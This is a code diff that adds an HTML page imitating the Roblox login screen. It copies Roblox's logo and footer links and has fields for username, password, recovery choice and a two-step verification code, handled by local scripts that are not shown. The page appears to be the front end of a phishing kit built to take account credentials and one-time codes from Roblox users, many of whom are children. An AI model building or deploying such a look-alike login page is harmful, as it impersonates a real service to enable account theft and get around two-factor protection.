@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 120 44" height="44" width="120" xmlns="http://www.w3.org/2000/svg">
+                <path d="M47.53 4.23h-4.6v35.57h4.6V4.23zM64.32 24.88c0-3.34-.84-5.99-2.5-7.93-1.67-1.95-4.1-2.93-7.3-2.93-3.22 0-5.67.98-7.33 2.93-1.67 1.95-2.5 4.6-2.5 7.95 0 3.32.84 5.96 2.5 7.9 1.66 1.94 4.1 2.92 7.3 2.92 3.22 0 5.67-.97 7.33-2.92 1.67-1.94 2.5-4.58 2.5-7.92zm-4.62.02c0 2.03-.35 3.58-1.06 4.66-.7 1.08-1.83 1.62-3.37 1.62-1.55 0-2.68-.54-3.4-1.62-.7-1.08-1.06-2.63-1.06-4.66 0-2.05.35-3.6 1.06-4.68.72-1.08 1.85-1.62 3.4-1.62 1.54 0 2.67.54 3.37 1.62.7 1.08 1.06 2.63 1.06 4.68zM76.7 39.8V16.73h4.25v3.5c1.15-2.7 2.98-4.05 5.5-4.05 1.9 0 3.4.7 4.5 2.1 1.1 1.4 1.65 3.26 1.65 5.6v19.93h-4.6V25.3c0-1.4-.33-2.45-1-3.15-.67-.7-1.6-1.05-2.8-1.05-1.3 0-2.3.48-3 1.43-.7.95-1.05 2.25-1.05 3.9v13.37h-4.45zM104.35 39.8V16.73h4.25v3.27c1.03-2.47 2.73-3.7 5.1-3.7.67 0 1.27.1 1.8.3.53.2.97.43 1.32.7V16.7c-.6-.3-1.27-.52-2-.67-.73-.15-1.45-.22-2.15-.22-1.93 0-3.45.67-4.55 2-1.1 1.33-1.65 3.23-1.65 5.7v16.3h-4.12z" fill="currentColor"></path>
+                <path d="M29.9 21.9c-.1-1.6-.4-3.1-.9-4.5-.5-1.4-1.2-2.6-2.1-3.7-.9-1-2-1.8-3.2-2.4-1.2-.6-2.6-1-4-1-1.4 0-2.8.3-4 .9-1.2.6-2.3 1.4-3.2 2.4-.9 1-1.6 2.2-2.1 3.6-.5 1.4-.8 2.9-.9 4.5-.1 1.6 0 3.2.2 4.7.2 1.5.6 3 1.2 4.3.6 1.3 1.4 2.5 2.4 3.5 1 1 2.1 1.8 3.4 2.4 1.3.6 2.7.9 4.2.9 1.5 0 2.9-.3 4.2-.9 1.3-.6 2.4-1.4 3.4-2.4 1-1 1.8-2.2 2.4-3.5.6-1.3 1-2.7 1.2-4.3.2-1.5.3-3 .2-4.6zm-4.6.2c0 1.8-.3 3.4-.8 4.9-.5 1.5-1.3 2.8-2.3 3.8-1 1-2.2 1.8-3.6 2.3-1.4.5-2.9.8-4.5.8-1.6 0-3.1-.3-4.5-.8-1.4-.5-2.6-1.3-3.6-2.3-1-1-1.8-2.3-2.3-3.8-.5-1.5-.8-3.1-.8-4.9 0-1.8.3-3.4.8-4.9.5-1.5 1.3-2.8 2.3-3.8 1-1 2.2-1.8 3.6-2.3 1.4-.5 2.9-.8 4.5-.8 1.6 0 3.1.3 4.5.8 1.4.5 2.6 1.3 3.6 2.3 1 1 1.8 2.3 2.3 3.8.5 1.5.8 3.1.8 4.9z" fill="currentColor"></path>
+                <path d="M22.3 15.7c.9 0 1.7.3 2.4.8.7.5 1.3 1.2 1.7 2.1.4.9.6 1.9.6 3 0 1.1-.2 2.1-.6 3-.4.9-1 1.6-1.7 2.1-.7.5-1.5.8-2.4.8-.9 0-1.7-.3-2.4-.8-.7-.5-1.3-1.2-1.7-2.1-.4-.9-.6-1.9-.6-3 0-1.1.2-2.1.6-3 .4-.9 1-1.6 1.7-2.1.7-.5 1.5-.8 2.4-.8z" fill="currentColor"></path>
+            </svg>
+        </div>
+        
+        <div id="loginForm">
+            <div class="form-group">
+                <label for="username">Username/Email/Phone</label>
+                <input type="text" id="username" autocomplete="username">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" autocomplete="current-password">
+            </div>
+            
+            <button class="login-btn" id="loginButton" onclick="handleLogin()">
+                <span class="btn-text">Log In</span>
+                <div class="btn-loading hidden">
+                    <div class="spinner"></div>
+                    <span>Logging in...</span>
+                </div>
+            </button>
+            
+            <div class="links">
+                <a href="#" onclick="showRecoveryOptions()">Forgot Password or Username?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="options">
+                <div class="option" onclick="showTwoFA('email')">
+                    <p>Email Me a One-Time Code</p>
+                </div>
+                <div class="option" onclick="showTwoFA('device')">
+                    <p>Use Another Device</p>
+                </div>
+            </div>
+            
+            <div class="links">
+                <p>Don't have an account? <a href="https://www.roblox.com/signup" target="_blank">Sign Up</a></p>
+            </div>
+        </div>
+        
+        <div id="recoveryOptions" class="hidden">
+            <h3>Recover Your Account</h3>
+            <p class="recovery-text">Select a recovery option:</p>
+            
+            <div class="recovery-option" onclick="showTwoFA('email')">
+                <div class="recovery-icon">📧</div>
+                <div class="recovery-details">
+                    <h4>Email Me a One-Time Code</h4>
+                    <p>Send a code to your email address</p>
+                </div>
+            </div>
+            
+            <div class="recovery-option" onclick="showTwoFA('phone')">
+                <div class="recovery-icon">📱</div>
+                <div class="recovery-details">
+                    <h4>Text Me a One-Time Code</h4>
+                    <p>Send a code to your phone number</p>
+                </div>
+            </div>
+            
+            <div class="links">
+                <a href="#" onclick="showLogin()">Back to Login</a>
+            </div>
+        </div>
+        
+        <div id="twoFAForm" class="hidden">
+            <h3>Two-Step Verification</h3>
+            <p class="twofa-text" id="twoFAMethod">Enter the verification code sent to your email</p>
+            
+            <div class="form-group">
+                <label for="verificationCode">Verification Code</label>
+                <input type="text" id="verificationCode" placeholder="Enter 6-digit code">
+            </div>
+            
+            <button class="login-btn" id="verifyButton" onclick="handleTwoFA()">
+                <span class="btn-text">Verify and Continue</span>
+                <div class="btn-loading hidden">
+                    <div class="spinner"></div>
+                    <span>Verifying...</span>
+                </div>
+            </button>
+            
+            <div class="links">
+                <a href="#" onclick="resendCode()">Resend Code</a>
+                <a href="#" onclick="showLogin()">Use a Different Method</a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://www.roblox.com/info/about">About Us</a>
+                <a href="https://www.roblox.com/careers">Jobs</a>
+                <a href="https://blog.roblox.com">Blog</a>
+                <a href="https://www.roblox.com/info/parents">Parents</a>
+                <a href="https://www.roblox.com/giftcards">Gift Cards</a>
+                <a href="https://en.help.roblox.com/hc/en-us">Help</a>
+                <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846">Terms</a>
+                <a href="https://www.roblox.com/info/accessibility">Accessibility</a>
+                <a href="https://www.roblox.com/info/privacy">Privacy</a>
+                <a href="https://www.roblox.com/info/ccpa">Your Privacy Choices</a>
+                <a href="https://www.roblox.com/info/cookie-config">Cookie Options</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
